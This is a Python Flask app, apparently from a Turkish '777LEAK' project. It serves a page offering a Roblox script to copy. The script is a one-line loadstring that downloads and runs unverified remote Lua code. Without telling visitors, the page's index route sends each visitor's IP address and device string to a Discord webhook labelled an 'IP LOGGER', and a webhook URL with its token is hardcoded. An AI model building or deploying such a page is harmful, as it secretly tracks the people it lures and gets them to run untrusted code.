import os
from flask import Flask, render_template_string, request
import requests
from datetime import datetime

app = Flask(__name__)

# --- AYARLAR ---
# Senin scriptin buraya yerleştirildi:
MEMO_CODE = """--[[
    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Documantation12/Universal-Vehicle-Script/main/Main.lua'))()"""
# --- --- --- ---

def send_discord_log(user_ip, user_agent):
    webhook_url = os.environ.get("https://canary.discord.com/api/webhooks/1484282391496233053/okuloaFgP9U_EqWit5KTyiE_uTGXG97cfiwTasTyACDmxdQQQh72LH9_mZrYNQ5yydsW")
    if webhook_url:
        zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        data = {
            "embeds": [{
                "title": "🌐 777LEAK - Yeni Giriş!",
                "description": f"**IP Adresi:** `{user_ip}`\n**Cihaz:** `{user_agent}`\n**Zaman:** `{zaman}`",
                "color": 12517631, # Parlak Mor
                "footer": {"text": "777LEAK IP LOGGER"}
            }]
        }
        try:
            requests.post(webhook_url, json=data)
        except Exception as e:
            print(f"Log Hatası: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>777Leak Script</title>
    <style>
        body {
            background-color: #050505;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .header {
            font-size: 3.5rem;
            font-weight: 900;
            margin-bottom: 30px;
            color: #fff;
            text-shadow: 0 0 10px #bf00ff, 0 0 20px #bf00ff, 0 0 40px #bf00ff;
            letter-spacing: 6px;
        }

        .code-container {
            position: relative;
            width: 85%;
            max-width: 900px;
            background-color: #000;
            border-radius: 15px;
            padding: 35px;
            /* Mor LED Efekti */
            box-shadow: 0 0 25px #8a2be2, inset 0 0 15px #8a2be2;
            border: 2px solid #ff00ff;
        }

        .code-block {
            font-family: 'Consolas', 'Courier New', monospace;
            background-color: transparent;
            color: #ff00ff;
            padding: 10px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin: 0;
            font-size: 1.1rem;
            line-height: 1.6;
            text-align: left;
        }

        .copy-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: linear-gradient(45deg, #8a2be2, #ff00ff);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 0.9rem;
            transition: 0.3s;
            box-shadow: 0 0 15px #ff00ff;
        }

        .copy-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 25px #ff00ff;
        }
    </style>
</head>
<body>

    <div class="header">777LEAK SCRIPT</div>

    <div class="code-container">
        <button class="copy-btn" onclick="copyCode()">KOPYALA</button>
        <pre class="code-block" id="scriptCode">{{ code_content }}</pre>
    </div>

    <script>
        function copyCode() {
            const codeText = document.getElementById('scriptCode').textContent;
            navigator.clipboard.writeText(codeText).then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = 'KOPYALANDI!';
                btn.style.background = '#2ecc71';
                setTimeout(() => {
                    btn.textContent = 'KOPYALA';
                    btn.style.background = 'linear-gradient(45deg, #8a2be2, #ff00ff)';
                }, 2000);
            });
        }
    </script>

</body>
</html>
"""

@app.route('/')
def index():
    # Gerçek kullanıcı IP'sini yakala (Render için proxy ayarı)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # Discord'a IP ve cihaz bilgisini gönder
    send_discord_log(ip, user_agent)
    
    return render_template_string(HTML_TEMPLATE, code_content=MEMO_CODE)

if __name__ == "__main__":
    # Render portunu otomatik alır, host 0.0.0.0 olmalı
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
